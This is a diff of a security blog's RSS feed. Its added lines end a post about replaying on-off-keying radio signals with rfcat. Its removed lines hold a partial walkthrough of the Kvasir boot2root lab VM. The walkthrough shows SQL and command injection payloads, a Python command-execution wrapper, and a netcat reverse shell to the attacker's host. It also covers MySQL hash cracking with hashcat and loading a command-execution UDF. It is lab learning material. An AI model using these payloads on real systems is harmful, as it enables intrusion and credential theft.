+        &lt;img src=&#34;https://leonjza.github.io/images/re_static_key_light_on.jpg&#34; /&gt;
+    
+    
+&lt;/figure&gt;
+
+
+&lt;h2 id=&#34;resources&#34;&gt;resources&lt;/h2&gt;
+
+&lt;p&gt;Below is basically a link dump of stuff that was super helpful in getting as far as I did with this. These posts may help clear things up that made no sense in this post!&lt;/p&gt;
+
+&lt;p&gt;General On-off keying stuff:&lt;br /&gt;
+- &lt;a href=&#34;http://andrewmohawk.com/2012/09/06/hacking-fixed-key-remotes/&#34;&gt;http://andrewmohawk.com/2012/09/06/hacking-fixed-key-remotes/&lt;/a&gt;&lt;br /&gt;
+- &lt;a href=&#34;https://zeta-two.com/radio/2015/06/23/ook-ask-sdr.html&#34;&gt;https://zeta-two.com/radio/2015/06/23/ook-ask-sdr.html&lt;/a&gt;&lt;br /&gt;
+- &lt;a href=&#34;http://www.rtl-sdr.com/using-a-yardstick-one-hackrf-and-inspectrum-to-decode-and-duplicate-an-ook-signal/&#34;&gt;http://www.rtl-sdr.com/using-a-yardstick-one-hackrf-and-inspectrum-to-decode-and-duplicate-an-ook-signal/&lt;/a&gt;&lt;br /&gt;
+- &lt;a href=&#34;https://blog.compass-security.com/2016/09/software-defied-radio-sdr-and-decoding-on-off-keying-ook/&#34;&gt;https://blog.compass-security.com/2016/09/software-defied-radio-sdr-and-decoding-on-off-keying-ook/&lt;/a&gt;&lt;br /&gt;
+- &lt;a href=&#34;http://leetupload.com/blagosphere/index.php/2014/02/24/non-return-to-zero-askook-signal-replay/&#34;&gt;http://leetupload.com/blagosphere/index.php/2014/02/24/non-return-to-zero-askook-signal-replay/&lt;/a&gt;&lt;br /&gt;
+- &lt;a href=&#34;http://adamsblog.aperturelabs.com/2013/03/you-can-ring-my-bell-adventures-in-sub.html&#34;&gt;http://adamsblog.aperturelabs.com/2013/03/you-can-ring-my-bell-adventures-in-sub.html&lt;/a&gt;&lt;br /&gt;
+- &lt;a href=&#34;http://dani.foroselectronica.es/rfcat-ti-chronos-and-replaying-rf-signals-337/&#34;&gt;http://dani.foroselectronica.es/rfcat-ti-chronos-and-replaying-rf-signals-337/&lt;/a&gt;&lt;/p&gt;
+
+&lt;p&gt;Sample code:&lt;br /&gt;
+- &lt;a href=&#34;https://github.com/AndrewMohawk/RfCatHelpers&#34;&gt;https://github.com/AndrewMohawk/RfCatHelpers&lt;/a&gt;&lt;br /&gt;
+- &lt;a href=&#34;https://github.com/ade-ma/LibOut/blob/master/scripts/rfcat-libout.py&#34;&gt;https://github.com/ade-ma/LibOut/blob/master/scripts/rfcat-libout.py&lt;/a&gt;&lt;br /&gt;
+- &lt;a href=&#34;https://github.com/alextspy/rolljam/blob/master/rf_car_jam.py&#34;&gt;https://github.com/alextspy/rolljam/blob/master/rf_car_jam.py&lt;/a&gt;&lt;/p&gt;
+
+&lt;h2 id=&#34;further-work&#34;&gt;further work&lt;/h2&gt;
+
+&lt;p&gt;With that done, I set off to write a toolkit that allows you to work with rfcat and On-off keying data sources such as wave files, or just simple recordings from rfcat itself. After finishing the polishing, I&amp;rsquo;ll release it along with a post detailing its internals and usage! In the meantime, keep an eye on this repository &lt;a href=&#34;https://github.com/leonjza/ooktools&#34;&gt;https://github.com/leonjza/ooktools&lt;/a&gt;&lt;/p&gt;
+
+
+&lt;figure &gt;
+    
+        &lt;img src=&#34;https://leonjza.github.io/images/re_static_key_ooktools.png&#34; /&gt;
+    
+    
+&lt;/figure&gt;
+
+
+&lt;p&gt;Happy hacking!&lt;/p&gt;
+</description>
+    </item>
     
     <item>
       <title>awesome nmap grep</title>
@@ -6527,1600 +7013,6 @@ a: For me? It was hard. Not necessarily just from a technical perspective, but a
 
 &lt;p&gt;&lt;strong&gt;q: Anything else?&lt;/strong&gt;
 a: TRY HARDER.&lt;/p&gt;
-</description>
-    </item>
-    
-    <item>
-      <title>solving kvasir netcat edition</title>
-      <link>https://leonjza.github.io/blog/2014/11/09/solving-kvasir-netcat-edition/</link>
-      <pubDate>Sun, 09 Nov 2014 10:27:09 +0000</pubDate>
-      
-      <guid>https://leonjza.github.io/blog/2014/11/09/solving-kvasir-netcat-edition/</guid>
-      <description>
-
-&lt;h2 id=&#34;introduction&#34;&gt;introduction&lt;/h2&gt;
-
-&lt;p&gt;&lt;a href=&#34;http://vulnhub.com/entry/kvasir-i,106/&#34;&gt;Kvasir&lt;/a&gt;, a boot2root by &lt;a href=&#34;https://twitter.com/_RastaMouse&#34;&gt;@_RastaMouse&lt;/a&gt; has to be one of my most favorite boot2roots to date, if not the most favorite. Favorite however does not mean it was easy. It also proved to be one of the most challenging ones I have had the chance to try!&lt;/p&gt;
-
-
-&lt;figure &gt;
-    
-        &lt;img src=&#34;https://leonjza.github.io/images/netcat.png&#34; /&gt;
-    
-    
-&lt;/figure&gt;
-
-
-&lt;p&gt;Kvasir is &lt;em&gt;extremely&lt;/em&gt; well polished, and it can be seen throughout the VM that &lt;a href=&#34;https://twitter.com/_RastaMouse&#34;&gt;@_RastaMouse&lt;/a&gt; has gone through a lot of effort to make every challenge as rewarding as possible. From exploiting simple web based vulnerabilities to service misconfigurations, traffic sniffing, steganography, forensics and cryptopraphy, Kvasir has it all! Solving it also had me make really heavy use of good old netcat.&lt;/p&gt;
-
-&lt;p&gt;This writeup details the path I took to read the final flag :)&lt;/p&gt;
-
-&lt;h2 id=&#34;a-usual-start&#34;&gt;a usual start&lt;/h2&gt;
-
-&lt;p&gt;Before we start off though, I feel its important to touch base on tunneling techniques used. All of the tunneling was done either via netcat, or via a SSH socks proxy. The socks proxies were accessed using &lt;code&gt;proxychains&lt;/code&gt;, and I was editing &lt;code&gt;/etc/proxychains.conf&lt;/code&gt; to match the port of the proxy I needed to use to reach my desired destination.&lt;/p&gt;
-
-&lt;p&gt;With that out the way, lets start.
-Almost all of the boot2roots have a discovery phase. After downloading the archive from &lt;a href=&#34;http://vulnhub.com&#34;&gt;vulnhub.com&lt;/a&gt;, I ran a ping scan in the subnet that my host-only network lives in. It returned with no results, and I realized there may already be more to this than anticipated. I engaged *lazy mode*™ and checked what the VirtualBox session showed the IP was:&lt;/p&gt;
-
-
-&lt;figure &gt;
-    
-        &lt;img src=&#34;https://leonjza.github.io/images/kvasir_ip.png&#34; /&gt;
-    
-    
-&lt;/figure&gt;
-
-
-&lt;p&gt;&lt;strong&gt;192.168.56.102&lt;/strong&gt;. Sweet, throwing &lt;code&gt;nmap&lt;/code&gt; at it showed only &lt;code&gt;tcp/80&lt;/code&gt; as open.&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;root@kali:~# nmap 192.168.56.102
-
-Starting Nmap 6.46 ( http://nmap.org ) at 2014-11-09 11:07 SAST
-Nmap scan report for 192.168.56.102
-Host is up (0.000061s latency).
-Not shown: 999 closed ports
-PORT   STATE SERVICE
-80/tcp open  http
-MAC Address: 08:00:27:CF:5D:57 (Cadmus Computer Systems)
-
-Nmap done: 1 IP address (1 host up) scanned in 0.20 seconds
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;h2 id=&#34;fink-ur-gud-enuf&#34;&gt;fink ur gud enuf?&lt;/h2&gt;
-
-&lt;p&gt;Browsing to the IP using Iceweasel, we see a login portal presented to us:&lt;/p&gt;
-
-
-&lt;figure &gt;
-    
-        &lt;img src=&#34;https://leonjza.github.io/images/kvasir_web.png&#34; /&gt;
-    
-    
-&lt;/figure&gt;
-
-
-&lt;p&gt;I made a few attempts at guessing a login, and eventually just threw a &lt;code&gt;&#39;&lt;/code&gt; at the username field:&lt;/p&gt;
-
-
-&lt;figure &gt;
-    
-        &lt;img src=&#34;https://leonjza.github.io/images/kvasir_web_sqli.png&#34; /&gt;
-    
-    
-&lt;/figure&gt;
-
-
-&lt;p&gt;I had a instant troll alert and figured it can&amp;rsquo;t be &lt;em&gt;that&lt;/em&gt; easy!? Changing the username payload from &lt;code&gt;&#39;&lt;/code&gt; to &lt;code&gt;&#39; OR 1=1 LIMIT 1--&lt;/code&gt; with a random word as a password, resulted in the application returning a &lt;code&gt;403&lt;/code&gt; type response. I figured that something strange was going on here, and fired up &lt;a href=&#34;http://portswigger.net/burp/&#34;&gt;Burp Suite&lt;/a&gt; to have a look under the hood at what is happening. As seen in the web browser, the web server really does respond with a HTTP 403:&lt;/p&gt;
-
-
-&lt;figure &gt;
-    
-        &lt;img src=&#34;https://leonjza.github.io/images/kvasir_login_403.png&#34; /&gt;
-    
-    
-&lt;/figure&gt;
-
-
-&lt;p&gt;Moving on to the register page. Registration required a username and password, as well as a date of birth. I registered &lt;code&gt;bob:bob&lt;/code&gt; with a DoB of &lt;code&gt;09/09/09&lt;/code&gt;, and attempted to login with the credentials:&lt;/p&gt;
-
-
-&lt;figure &gt;
-    
-        &lt;img src=&#34;https://leonjza.github.io/images/kvasir_member.png&#34; /&gt;
-    
-    
-&lt;/figure&gt;
-
-
-&lt;p&gt;Not a very useful web application so far, but nonetheless, I figured there is something I am not seeing yet. I went back to the registration page and attempted some SQLi payloads there. The form definitely seemed vulnerable to SQLi, and I managed to uncover a part of the backend query as &lt;code&gt;&#39;a&#39;, &#39;a&#39;, 0, NULL)&lt;/code&gt;. Considering this was a new account registration page, my guess was that this was part of a &lt;code&gt;INSERT&lt;/code&gt; query:&lt;/p&gt;
-
-
-&lt;figure &gt;
-    
-        &lt;img src=&#34;https://leonjza.github.io/images/kvasir_submit_sqli.png&#34; /&gt;
-    
-    
-&lt;/figure&gt;
-
-
-&lt;p&gt;It was about at this time where that thing called real life started to interfere and drive my attention away from Kvasir. While working, I decided to run trusty &amp;lsquo;ol &lt;code&gt;wfuzz&lt;/code&gt; on the web service to see if there was anything interesting to reveal:&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;root@kali:~# wfuzz -c -z file,/usr/share/wordlists/wfuzz/general/medium.txt  --hc 404 http://192.168.56.102/FUZZ.php
-
-********************************************************
-* Wfuzz  2.0 - The Web Bruteforcer                     *
-********************************************************
-
-Target: http://192.168.56.102/FUZZ.php
-Payload type: file,/usr/share/wordlists/wfuzz/general/medium.txt
-
-Total requests: 1660
-==================================================================
-ID  Response   Lines      Word         Chars          Request
-==================================================================
-
-00077:  C=302     16 L        34 W      365 Ch    &amp;quot; - admin&amp;quot;
-00302:  C=403     10 L        30 W      294 Ch    &amp;quot; - cgi-bin/&amp;quot;
-00394:  C=403     10 L        30 W      292 Ch    &amp;quot; - create&amp;quot;
-00455:  C=403     10 L        30 W      294 Ch    &amp;quot; - descarga&amp;quot;
-00457:  C=403     10 L        30 W      296 Ch    &amp;quot; - descarrega&amp;quot;
-00463:  C=403     10 L        30 W      298 Ch    &amp;quot; - descarregues&amp;quot;
-00741:  C=200     20 L        44 W      464 Ch    &amp;quot; - index&amp;quot;
-00894:  C=403     10 L        30 W      290 Ch    &amp;quot; - load&amp;quot;
-00901:  C=302      0 L         0 W        0 Ch    &amp;quot; - login&amp;quot;
-00904:  C=302      0 L         0 W        0 Ch    &amp;quot; - logout&amp;quot;
-00964:  C=302     15 L        16 W      168 Ch    &amp;quot; - member&amp;quot;
-01247:  C=200     17 L        39 W      426 Ch    &amp;quot; - register&amp;quot;
-01331:  C=403     10 L        30 W      292 Ch    &amp;quot; - select&amp;quot;
-01432:  C=200      0 L         0 W        0 Ch    &amp;quot; - submit&amp;quot;
-01556:  C=403     10 L        30 W      292 Ch    &amp;quot; - update&amp;quot;
-01565:  C=403     10 L        30 W      293 Ch    &amp;quot; - updates&amp;quot;
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;Woa, thats quite a bit of results to work through eh :)&lt;/p&gt;
-
-&lt;h2 id=&#34;admins-only-want-to-302-here&#34;&gt;admins only want to 302 here&lt;/h2&gt;
-
-&lt;p&gt;Of everything &lt;code&gt;wfuzz&lt;/code&gt; revealed to us, &lt;code&gt;admin.php&lt;/code&gt; was the most interesting one. Watching Burp as the requests went up and down, I noticed that &lt;code&gt;admin.php&lt;/code&gt; would return a HTTP 302 code with a location, along with an actual body:&lt;/p&gt;
-
-
-&lt;figure &gt;
-    
-        &lt;img src=&#34;https://leonjza.github.io/images/kvasir_admin_php.png&#34; /&gt;
-    
-    
-&lt;/figure&gt;
-
-
-&lt;p&gt;Sweet! I modified the response in Burp to return &lt;code&gt;200&lt;/code&gt; instead, and removed the &lt;code&gt;Location:&lt;/code&gt; header. We now had a new page to work with :)&lt;/p&gt;
-
-
-&lt;figure &gt;
-    
-        &lt;img src=&#34;https://leonjza.github.io/images/kvasir_admin_bypass.png&#34; /&gt;
-    
-    
-&lt;/figure&gt;
-
-
-&lt;p&gt;The form hints that we can check the service status of daemons running on the underlying OS, and suggests &lt;code&gt;apache2&lt;/code&gt; as input. I submitted the form with &lt;code&gt;apache2&lt;/code&gt; as the service, and got back a response (that also tried to 302 but I fixed that :D) with a new section &lt;code&gt;Apache2 is running (pid 1330).&lt;/code&gt;. This just &lt;strong&gt;screams&lt;/strong&gt; command injection doesn’t it?&lt;/p&gt;
-
-&lt;h2 id=&#34;command-injection&#34;&gt;command injection&lt;/h2&gt;
-
-&lt;p&gt;In order for me to fuzz this further, I took the request to trusty &amp;lsquo;ol &lt;code&gt;curl&lt;/code&gt;. While doing this, I realized that &lt;code&gt;admin.php&lt;/code&gt; did no checks to ensure that we are authenticated or anything. We could simply submit &lt;code&gt;service=&amp;lt;payload&amp;gt;&lt;/code&gt; as a POST to &lt;code&gt;admin.php&lt;/code&gt; and get output:&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;root@kali:~# curl &#39;http://192.168.56.102/admin.php&#39; --data &#39;service=apache2;&#39;
-
-&amp;lt;html&amp;gt;
-&amp;lt;body&amp;gt;
-&amp;lt;div align=&amp;quot;center&amp;quot;&amp;gt;
-
-&amp;lt;h1&amp;gt;Service Check&amp;lt;/h1&amp;gt;
-
-&amp;lt;form name=&amp;quot;service&amp;quot; method=&amp;quot;post&amp;quot; action=&amp;quot;&amp;quot;&amp;gt;
-&amp;lt;input name=&amp;quot;service&amp;quot; id=&amp;quot;service&amp;quot; type=&amp;quot;text&amp;quot; placeholder=&amp;quot;apache2&amp;quot; /&amp;gt;&amp;lt;br /&amp;gt;&amp;lt;br /&amp;gt;
-&amp;lt;input name=&amp;quot;submit&amp;quot; id=&amp;quot;submit&amp;quot; type=&amp;quot;submit&amp;quot; value=&amp;quot;Submit&amp;quot; /&amp;gt;
-&amp;lt;/form&amp;gt;
-
-&amp;lt;form action=&amp;quot;logout.php&amp;quot; method=&amp;quot;post&amp;quot;&amp;gt;
-&amp;lt;input type=&amp;quot;submit&amp;quot; value=&amp;quot;Logout&amp;quot; /&amp;gt;
-&amp;lt;/form&amp;gt;
-
-&amp;lt;pre&amp;gt;Usage: /etc/init.d/apache2 {start|stop|graceful-stop|restart|reload|force-reload|start-htcacheclean|stop-htcacheclean|status}.
-&amp;lt;/pre&amp;gt;
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;Entering &lt;code&gt;apache2;&lt;/code&gt; as the input, revealed the first step in our command injection. With &lt;code&gt;apache2;&lt;/code&gt; as the payload, I figured that the php script was taking our user input and running with the following pseudo code:&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&#34;language-php&#34;&gt;&amp;lt;?php
-
-print system(&amp;quot;/etc/init.d/&amp;quot; . $_POST[&amp;quot;service&amp;quot;] . &amp;quot; status&amp;quot;);
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;So, with our payload, we have modified this to run &lt;code&gt;/etc/init.d/apache2; status&lt;/code&gt;, which will fail for obvious reasons! A little more fiddling finally got me to a working payload by posting &lt;code&gt;service=&lt;/code&gt; as &lt;code&gt;;echo &#39;id&#39;;&lt;/code&gt; where the single quotes are actually back ticks. (octopress grrr)&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;root@kali:~# curl &#39;http://192.168.56.102/admin.php&#39; --data &#39;service=;echo `id`;&#39;
-
-[... snip ...]
-
-&amp;lt;pre&amp;gt;uid=33(www-data) gid=33(www-data) groups=33(www-data)
-&amp;lt;/pre&amp;gt;
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;h2 id=&#34;netcat-is-our-entry-into-the-rabbit-hole&#34;&gt;netcat is our entry into the rabbit hole&lt;/h2&gt;
-
-&lt;p&gt;With the command injection now exploitable, I grabbed some skeleton code that I normally use to try and make these types of command execution vulnerabilities slightly easier to work with. The basic premise is to have the command executed, and the response regex&amp;rsquo;d out. This ended up as the following python script:&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;#!/usr/bin/python
-
-# Kvasir Command Execution
-
-# $ python cmd.py &amp;quot;uname -a&amp;quot;
-# Command to run: uname -a
-#
-# Linux web 3.2.0-4-amd64 #1 SMP Debian 3.2.60-1+deb7u3 x86_64 GNU/Linux
-
-import requests
-import re
-import sys
-import os
-import binascii
-
-print &#39;Command to run: %s&#39; % sys.argv[1]
-
-# generate 2 random strings so that we can regex out the command output
-command_start = binascii.b2a_hex(os.urandom(30))
-command_end = binascii.b2a_hex(os.urandom(30))
-
-# prepare something that we can regex out
-params = {&#39;service&#39; : &#39;;echo %s; echo `%s`; echo %s;&#39; % (command_start, sys.argv[1], command_end) }
-
-#fetch, ignoring the troll redirect
-r = requests.post(&#39;http://192.168.56.102/admin.php&#39;, params, allow_redirects=False)
-
-#match regex and print
-print  re.findall(r&#39;%s([^|]+)%s&#39; % (command_start, command_end), r.text)[0].replace(&#39;\n%s\n&#39; % command_end,&#39;&#39;)
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;So, now I can just run &lt;code&gt;python cmd.py &amp;quot;id&amp;quot;&lt;/code&gt; and get the output (the &lt;em&gt;(kvasir)&lt;/em&gt; in front of my prompt is my python virtualenv where I installed the &lt;code&gt;requests&lt;/code&gt; dependency):&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;(kvasir)root@kali:~# python cmd.py &amp;quot;id&amp;quot;
-Command to run: id
-
-uid=33(www-data) gid=33(www-data) groups=33(www-data)
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;And so, initial enumeration was done. Immediately I noticed that this host had 2 network interfaces. &lt;strong&gt;192.168.1.100&lt;/strong&gt; and &lt;strong&gt;192.168.2.100&lt;/strong&gt;. No sign of &lt;strong&gt;192.168.56.102&lt;/strong&gt; here&amp;hellip; It also seemed like I would be able to build a netcat shell out of this environment to my attacking host, so I set up a listener with &lt;code&gt;nc -lvp 4444&lt;/code&gt;, and connected to it using my &lt;code&gt;cmd.py&lt;/code&gt; script &lt;code&gt;python cmd.py &amp;quot;/bin/nc 192.168.56.101 4444 -e /bin/bash&amp;quot;&lt;/code&gt;:&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;root@kali:~# nc -lvp 4444
-listening on [any] 4444 ...
-192.168.56.102: inverse host lookup failed: Unknown server error : Connection timed out
-connect to [192.168.56.101] from (UNKNOWN) [192.168.56.102] 53516
-id
-uid=33(www-data) gid=33(www-data) groups=33(www-data)
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;So, in order to make sure we don&amp;rsquo;t lose our place, consider the following simple diagram showing the network paths for gaining first shell access to the host &lt;code&gt;web&lt;/code&gt;:&lt;/p&gt;
-
-
-&lt;figure &gt;
-    
-        &lt;img src=&#34;https://leonjza.github.io/images/kvasir_network_graph_1.png&#34; /&gt;
-    
-    
-&lt;/figure&gt;
-
-
-&lt;p&gt;The only public presence of the internal network is therefore the originally discovered &lt;strong&gt;192.168.56.102&lt;/strong&gt; IP address.&lt;/p&gt;
-
-&lt;h2 id=&#34;my-see-qual-as-root-deserves-a-slap-on-the-wrist&#34;&gt;my-see-qual as root deserves a slap on the wrist&lt;/h2&gt;
-
-&lt;p&gt;With semi interactive shell access using &lt;code&gt;netcat&lt;/code&gt; to &lt;strong&gt;web&lt;/strong&gt; (192.168.1.100), some more enumeration was done. Most importantly, the sources serving the web site that I have exploited to gain a command shell revealed credentials and a host of a MySQL instance. Consider the following extract from &lt;code&gt;member.php&lt;/code&gt;:&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&#34;language-php&#34;&gt;&amp;lt;?php
-
-session_start();
-
-if (!isset($_SESSION[&amp;quot;member&amp;quot;])) {
-    header(&amp;quot;Location: index.php&amp;quot;);
-}
-
-$user = $_SESSION[&amp;quot;username&amp;quot;];
-
-mysql_connect(&amp;quot;192.168.2.200&amp;quot;, &amp;quot;webapp&amp;quot;, &amp;quot;webapp&amp;quot;) or die(mysql_error());
-mysql_select_db(&amp;quot;webapp&amp;quot;) or die(mysql_error());
-
-$query = &amp;quot;SELECT dob FROM users WHERE username=&#39;$user&#39;&amp;quot;;
-$result = mysql_query($query) or die(mysql_error());
-
-?&amp;gt;
-[... snip ...]
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;So mysql access with &lt;code&gt;webapp:webapp&lt;/code&gt; at 192.168.2.200. Lets test this and check out the server. I executed commands using mysql -e on the netcat shell that just spawned:&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;mysql -uwebapp -pwebapp -h 192.168.2.200 -e &#39;show grants;&#39;
-Grants for webapp@192.168.2.100
-GRANT SELECT, INSERT ON *.* TO &#39;webapp&#39;@&#39;192.168.2.100&#39; IDENTIFIED BY PASSWORD &#39;*BF7C27E734F86F28A9386E9759D238AFB863BDE3&#39;
-GRANT ALL PRIVILEGES ON `webapp`.* TO &#39;webapp&#39;@&#39;192.168.2.100&#39;
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;So I can select anywhere. Nice :)&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;mysql -uwebapp -pwebapp -h 192.168.2.200 -e &#39;use webapp; show tables;&#39;
-Tables_in_webapp
-todo
-users
-mysql -uwebapp -pwebapp -h 192.168.2.200 -e &#39;use webapp; select * from todo;&#39;
-task
-stop running mysql as root
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;A table called &lt;code&gt;todo&lt;/code&gt; exists, with a string &lt;code&gt;stop running mysql as root&lt;/code&gt;. That was the first hint and immediately had me thinking about &lt;a href=&#34;http://www.mysqludf.org/&#34;&gt;MySQL UDF&lt;/a&gt;&amp;rsquo;s, one which could allow us to run system commands. However, in order to get a UDF loaded, I will need a dba level account, one which I don&amp;rsquo;t have yet. From the previous grants output, I can see that I am allowed to query any table on the database server, so lets get some administrative hashes:&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;mysql -uwebapp -pwebapp -h 192.168.2.200 -e &#39;use mysql; select DISTINCT User,Password from user;&#39;
-User    Password
-root    *ECB01D78C2FBEE997EDA584C647183FD99C115FD
-debian-sys-maint    *E0E0871376896664A590151D348CCE9AA800435B
-webapp  *BF7C27E734F86F28A9386E9759D238AFB863BDE3
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;As a side note, further enumeration of the PHP sources and MySQL table &lt;code&gt;users&lt;/code&gt; showed that if we injected SQL on the registration page to add a extra &lt;code&gt;1&lt;/code&gt;, we would be considered an admin, and would have also seen the admin page that is vulnerable to the already found command injection.&lt;/p&gt;
-
-&lt;h3 id=&#34;cracking-root-s-mysql-password&#34;&gt;cracking root&amp;rsquo;s MySQL password&lt;/h3&gt;
-
-&lt;p&gt;Now that I had the password hash for the root user, I proceeded to try and crack it. For this I used &lt;code&gt;hashcat&lt;/code&gt; with the ever famous &lt;code&gt;rockyou&lt;/code&gt; wordlist:&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;# first, echo the hash to a file
-root@kali:~# echo &amp;quot;ECB01D78C2FBEE997EDA584C647183FD99C115FD&amp;quot; &amp;gt; db.root
-
-# next, we tell hash cat the type of hash we have and wait a few seconds :)
-root@kali:~# hashcat -m 300 db.root /usr/share/wordlists/rockyou.txt
-This copy of hashcat will expire on 01.01.2015. Please upgrade to continue using hashcat.
-
-Initializing hashcat v0.47 by atom with 8 threads and 32mb segment-size...
-
-Added hashes from file db.root: 1 (1 salts)
-Activating quick-digest mode for single-hash
-
-NOTE: press enter for status-screen
-
-ecb01d78c2fbee997eda584c647183fd99c115fd:coolwater
-
-All hashes have been recovered
-
-Input.Mode: Dict (/usr/share/wordlists/rockyou.txt)
-Index.....: 1/5 (segment), 3627099 (words), 33550339 (bytes)
-Recovered.: 1/1 hashes, 1/1 salts
-Speed/sec.: - plains, 3.27M words
-Progress..: 281260/3627099 (7.75%)
-Running...: --:--:--:--
-Estimated.: 00:00:00:01
-
-Started: Sun Nov  9 14:07:14 2014
-Stopped: Sun Nov  9 14:07:14 2014
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;The password for the MySQL &lt;code&gt;root&lt;/code&gt; user is therefore &lt;code&gt;coolwater&lt;/code&gt;:&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;mysql -uroot -pcoolwater -h 192.168.2.200 -e &#39;show grants;&#39;
-Grants for root@192.168.2.100
-GRANT ALL PRIVILEGES ON *.* TO &#39;root&#39;@&#39;192.168.2.100&#39; IDENTIFIED BY PASSWORD &#39;*ECB01D78C2FBEE997EDA584C647183FD99C115FD&#39; WITH GRANT OPTION
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;h3 id=&#34;loading-the-udf-remotely&#34;&gt;loading the UDF remotely&lt;/h3&gt;
-
-&lt;p&gt;With a full dba level account, it was time to get the UDF loaded. My initial approach for this failed pretty badly to start off with.&lt;/p&gt;
-
-&lt;p&gt;I grabbed a copy of a &lt;code&gt;do_system()&lt;/code&gt; UDF that I have previously used successfully from &lt;a href=&#34;http://www.0xdeadbeef.info/exploits/raptor_udf.c&#34;&gt;here&lt;/a&gt;, called &lt;code&gt;raptor_udf.c&lt;/code&gt;. Considering the host operating system was 64bit, and my attacking machine was 32bit, I opted to compile the UDF on the &lt;code&gt;web&lt;/code&gt; host. Compilation was done on the &lt;code&gt;web&lt;/code&gt; host with:&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;gcc -g -c raptor_udf.c -fPIC
-gcc -g -shared -Wl,--soname,raptor_udf.so -o raptor_udf.so raptor_udf.o -lc
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;This resulted in a raptor_udf.so file, which was ready to be uploaded to the server. Now, the word &lt;code&gt;uploading&lt;/code&gt; sounds trivial, however its not. I need to know &lt;em&gt;where&lt;/em&gt; to first. For this, I enumerate the MySQL &lt;code&gt;plugin_dir&lt;/code&gt;:&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;mysql -uroot -pcoolwater -h 192.168.2.200 -e &#39;select @@plugin_dir;&#39;
-@@plugin_dir
-/usr/lib/mysql/plugin/
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;So this means I need to write the udf to &lt;code&gt;/usr/lib/mysql/plugin/raptor_udf.so&lt;/code&gt;. Fair enough. But how do I write this? Well there are many approaches to this. One is to use &lt;code&gt;--local-infile=1&lt;/code&gt; as a flag on the local mysqlclient (needs to be allowed server side too), to actually upload the &lt;strong&gt;local&lt;/strong&gt; file to wherever (a table in our case) and then to a file via &lt;code&gt;INTO DUMPFILE&lt;/code&gt;. The other option is to simply convert the content to hex, and run &lt;code&gt;SELECT 0x&lt;/code&gt; + &lt;code&gt;&amp;lt;CONTENT AS HEX&amp;gt;&lt;/code&gt; + &lt;code&gt;INTO DUMPFILE /usr/lib/mysql/plugin/raptor_udf.so&lt;/code&gt;.&lt;/p&gt;
-
-&lt;p&gt;I opted for the content encoding as hex and generated a &lt;code&gt;xxd&lt;/code&gt; output of the compiled &lt;code&gt;raptor_udf.so&lt;/code&gt;. With this uploaded, I came to the section where the function was to be created, and this is where I got stuck. I would simply get a error along the likes of &lt;code&gt;Undefined Symbol &amp;quot;do_system&amp;quot; in raptor_udf.so&lt;/code&gt;. :&lt;/p&gt;
-
-&lt;p&gt;Eventually, I opted to find a precompiled 64bit &lt;code&gt;.so&lt;/code&gt; to upload, and found one in the &lt;a href=&#34;https://github.com/sqlmapproject/sqlmap/blob/master/udf/mysql/linux/64/lib_mysqludf_sys.so&#34;&gt;sqlmap repository&lt;/a&gt;. I downloaded this and converted it to hex using &lt;code&gt;xxd&lt;/code&gt;. I then created the following file with the mysql commands to run on the &lt;code&gt;web&lt;/code&gt; host from my attacking machine:&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;root@kali:~# cat load_udf.sh
-touch log
-mysql -uroot -pcoolwater -h 192.168.2.200 -e &#39;use mysql; select 0x7f454
-
-    [... snip ... but the this the output of xxd -p lib_mysqludf_sys.so ]
-
-0000000000000 into dumpfile &amp;quot;/usr/lib/mysql/plugin/raptor_udf.so&amp;quot;;&#39; 2&amp;gt;&amp;gt; log
-mysql -uroot -pcoolwater -h 192.168.2.200 -e &#39;create function sys_exec returns integer soname &amp;quot;raptor_udf.so&amp;quot;;&#39; 2&amp;gt;&amp;gt; log
-mysql -uroot -pcoolwater -h 192.168.2.200 -e &#39;use mysql; select * from mysql.func;&#39; 2&amp;gt;&amp;gt; log
-
-# this adds me a SSH key to roots authorized keys using the command execution udf we have prepared
